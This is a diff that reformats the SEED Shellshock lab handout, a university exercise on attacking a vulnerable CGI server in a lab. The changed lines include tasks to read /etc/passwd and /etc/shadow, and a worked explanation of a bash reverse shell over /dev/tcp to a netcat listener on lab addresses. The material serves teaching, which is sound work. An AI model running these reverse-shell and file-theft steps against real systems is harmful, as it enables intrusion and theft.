@@ -28,7 +28,7 @@ following topics:
 
 - Chapter 3 of the SEED Book,_Computer & Internet Security: A Hands-on Approach,_ 2nd Edition, by
     Wenliang Du. See details at https://www.handsonsecurity.net.
-- Section 3 of the SEED Lecture at _Udemy,Computer Security: A Hands-on Approach,_ by Wenliang
+- Section 3 of the SEED Lecture at Udemy,_Computer Security: A Hands-on Approach,_ by Wenliang
     Du. See details at https://www.handsonsecurity.net/video.html.
 
 **Lab environment.** You can perform the lab exercise on the SEED VM provided by the Cloudlabs.
@@ -208,7 +208,7 @@ In this task, please use three different approaches (i.e., three different HTTP 
 Shellshock attack against the target CGI program. You need to achieve the following objectives. For each
 objective, you only need to use one approach, but in total, you need to use three different approaches.
 
-- Task 3.A: Get the server to send back the content of the /etc/passwd file.
+- Task 3.A: Get the server to send back the content of the _/etc/passwd_ file.
 - Task 3.B: Get the server to tell you its process’ user ID. You can use the /bin/id command to print
     out the ID information.
 - Task 3.C: Get the server to create a file inside the /tmp folder. You need to get into the container to
@@ -217,7 +217,7 @@ objective, you only need to use one approach, but in total, you need to use thre
 
 Questions. Please answer the following questions:
 
-- Question 1: Will you be able to steal the content of the shadow file/etc/shadow from the server?
+- Question 1: Will you be able to steal the content of the shadow file /etc/shadow from the server?
     Why or why not? The information obtained in Task 3.B should give you a clue.
 - Question 2: HTTP GET requests typically attach data in the URL, after the ? mark. This could be
     another approach that we can use to launch the attack. In the following example, we attach some data
@@ -259,10 +259,10 @@ other end of the connection is a program run by the attacker; the program simply
 
 from the shell at the other end, and sends whatever is typed by the attacker to the shell, over the network
 connection.
-A commonly used program by attackers is netcat, which, if running with the "-l" option, becomes
+A commonly used program by attackers is _netcat_, which, if running with the _"-l"_ option, becomes
 a TCP server that listens for a connection on the specified port. This server program basically prints out
 whatever is sent by the client, and sends to the client whatever is typed by the user running the server. In the
-following experiment, netcat(ncfor short) is used to listen for a connection on port 9090 (let us focus
+following experiment, _netcat_(ncfor short) is used to listen for a connection on port _9090_ (let us focus
 only on the first line).
 ```
 Attacker(10.0.2.6):$ nc -nv -l 9090  <- **Waiting for reverse shell**
@@ -275,35 +275,35 @@ enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500
 inet **10.0.2.5** netmask 255.255.255.0 broadcast 10.0.2.
 ...
 ```
-The abov enc command will block, waiting for a connection. We now directly run the following bash
-program on the Server machine (10.0.2.5) to emulate what attackers would run after compromising the
+The above _nc_ command will block, waiting for a connection. We now directly run the following bash
+program on the Server machine _(10.0.2.5)_ to emulate what attackers would run after compromising the
 server via the Shellshock attack. This bash command will trigger a TCP connection to the attacker machine’s
 port 9090, and a reverse shell will be created. We can see the shell prompt from the above result, indicating
-that the shell is running on the Server machine; we can type the ifconfig command to verify that the IP
-address is indeed 10.0.2.5, the one belonging to the Server machine. Here is the bash command:
+that the shell is running on the Server machine; we can type the _ifconfig_ command to verify that the IP
+address is indeed _10.0.2.5,_ the one belonging to the Server machine. Here is the bash command:
 ```
 Server(10.0.2.5):$ /bin/bash -i > /dev/tcp/10.0.2.6/9090 0<&1 2>&
 ```
 The above command represents the one that would normally be executed on a compromised server. It is
 quite complicated, and we give a detailed explanation in the following:
 
-- "/bin/bash -i": The option i stands for interactive, meaning that the shell must be interactive
+- _"/bin/bash -i":_ The option i stands for interactive, meaning that the shell must be interactive
     (must provide a shell prompt).
-- "> /dev/tcp/10.0.2.6/9090": This causes the output device (stdout) of the shell to be
+-_ "> /dev/tcp/10.0.2.6/9090":_ This causes the output device (stdout) of the shell to be
     redirected to the TCP connection to 10.0.2.6’s port 9090. In Unix systems,stdout’s file
     descriptor is 1.
-- "0<&1": File descriptor 0 represents the standard input device (stdin). This option tells the system
+- _"0<&1":_ File descriptor 0 represents the standard input device (stdin). This option tells the system
     to use the standard output device as the stardard input device. Sincestdoutis already redirected to
     the TCP connection, this option basically indicates that the shell program will get its input from the
     same TCP connection.
-- "2>&1": File descriptor 2 represents the standard error stderr. This causes the error output to be
+-_ "2>&1":_ File descriptor 2 represents the standard error stderr. This causes the error output to be
     redirected tostdout, which is the TCP connection.
 
-In summary, the command "/bin/bash -i > /dev/tcp/10.0.2.6/9090 0<&1 2>&1" starts
+In summary, the command_ "/bin/bash -i > /dev/tcp/10.0.2.6/9090 0<&1 2>&1"_ starts
 a bashshell on the server machine, with its input coming from a TCP connection, and output going to the
-same TCP connection. In our experiment, when the bashshell command is executed on 10.0.2.5, it
-connects back to the netcat process started on10.0.2.6. This is confirmed via the "Connection
-from 10.0.2.5 ..." message displayed by netcat.
+same TCP connection. In our experiment, when the bashshell command is executed on _10.0.2.5_, it
+connects back to the netcat process started on_ 10.0.2.6._ This is confirmed via the _"Connection
+from 10.0.2.5 ..."_ message displayed by _netcat._
 
 
 ## 5 Submission
